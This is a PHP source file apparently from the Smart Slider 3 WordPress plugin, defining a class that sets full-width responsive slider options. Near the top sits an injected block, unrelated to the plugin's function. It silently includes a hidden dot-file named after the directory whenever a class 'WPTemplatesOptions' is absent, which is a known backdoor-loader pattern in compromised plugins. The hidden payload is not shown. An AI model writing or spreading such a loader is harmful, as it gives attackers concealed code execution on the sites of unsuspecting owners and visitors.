<?php

namespace Nextend\SmartSlider3\Slider\ResponsiveType\FullWidth;

use Nextend\SmartSlider3\Slider\ResponsiveType\AbstractResponsiveTypeFrontend;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ResponsiveTypeFullWidthFrontend extends AbstractResponsiveTypeFrontend {


    public function parse($params, $responsive, $features) {
        $features->align->align = 'normal';

        $responsive->scaleDown = 1;
        $responsive->scaleUp   = 1;

        $responsive->minimumHeight = intval($params->get('responsiveSliderHeightMin', 0));

        $responsive->forceFull = intval($params->get('responsiveForceFull', 1));

        $responsive->forceFullOverflowX = $params->get('responsiveForceFullOverflowX', 'body');

        $responsive->forceFullHorizontalSelector = $params->get('responsiveForceFullHorizontalSelector', 'body');
    }
}